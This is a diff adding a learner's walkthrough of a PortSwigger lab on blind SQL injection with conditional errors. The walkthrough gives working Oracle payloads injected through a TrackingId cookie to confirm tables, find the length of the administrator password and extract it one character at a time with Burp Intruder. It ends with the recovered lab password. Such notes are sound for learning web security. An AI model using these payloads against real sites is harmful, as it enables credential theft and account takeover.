@@ -36,6 +36,38 @@ length: The number of characters to extract.
 
 ## Lab 11: Blind SQL injection with conditional errors [Link](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-error-based-sql-injection/sql-injection/blind/lab-conditional-errors)
 ```
+If there is Error, means the Query is getting processed by Server & We can give conditions to test for the payloads
+
+TrackingId=3K2lIneuWTHL6FqO' Error
+TrackingId=3K2lIneuWTHL6FqO'' No Error
+
+'||(SELECT '')||' error
+'||(SELECT '' from dual)||' No error (ORacle DB)
+
+TrackingId=3K2lIneuWTHL6FqO'||(SELECT '' from Incorrect_table)||'; Error means the query is getting processed at server end
+TrackingId=3K2lIneuWTHL6FqO'||(SELECT '' from users where ROWNUM=1)||'; No error means the `Users` table exists in DB
+
+TrackingId=3K2lIneuWTHL6FqO'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'; Error means the query is getting processed at server end
+TrackingId=3K2lIneuWTHL6FqO'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'; Codition True, No Error with this.
+
+TrackingId=3K2lIneuWTHL6FqO'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator')||';  Error, confirms that there is a user named Administrator
+TrackingId=3K2lIneuWTHL6FqO'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator')||';  Error, confirms that the password Length is > 1
+
+TrackingId=3K2lIneuWTHL6FqO'||(SELECT CASE WHEN LENGTH(password)>=20 THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator')||'; Confirms the Length is of 20 characters
+```
+
+- Use SUBSTR( string, start_position [, length ]) to check the password length
+- Use Intruder's Sniper Attack type to fuzz the password by comparing each & every position from SUBSTR(password,1,1) to SUBSTR(password,20,1)
+- Copy each letter from result if recieved Error 500, use the same to login after extracting all 20 letters.
+
+```
+TrackingId=3K2lIneuWTHL6FqO'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator')||';  
+
+TrackingId=3K2lIneuWTHL6FqO'||(SELECT CASE WHEN SUBSTR(password,20,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator')||';  
+
+hn8u07gig6zkt9947d47
+
+- Now, login with extracted passsword.
 ```
 
 
